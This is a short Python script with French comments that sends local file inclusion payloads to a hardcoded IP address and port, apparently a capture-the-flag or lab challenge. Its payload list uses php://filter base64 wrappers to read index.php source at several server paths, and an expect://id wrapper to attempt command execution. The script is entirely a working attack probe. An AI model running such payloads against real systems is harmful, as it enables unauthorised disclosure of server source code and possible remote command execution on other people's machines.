import requests

url = 'http://51.159.16.22:8027/'

# Tenter de lire le source via php://filter (LFI)
payloads = [
    # PHP filter wrapper
    '/?name=php://filter/convert.base64-encode/resource=index.php',
    '/?name=php://filter/read=convert.base64-encode/resource=index.php',
    # Via expect
    '/?name=expect://id',
    # Chemin absolu
    '/?name=php://filter/convert.base64-encode/resource=/var/www/html/index.php',
    '/?name=php://filter/convert.base64-encode/resource=/app/index.php',
    '/?name=php://filter/convert.base64-encode/resource=/srv/index.php',
]

for p in payloads:
    r = requests.get(url + p)
    print(f'[{p[:60]}]')
    print(r.text[:300])
    print('---')
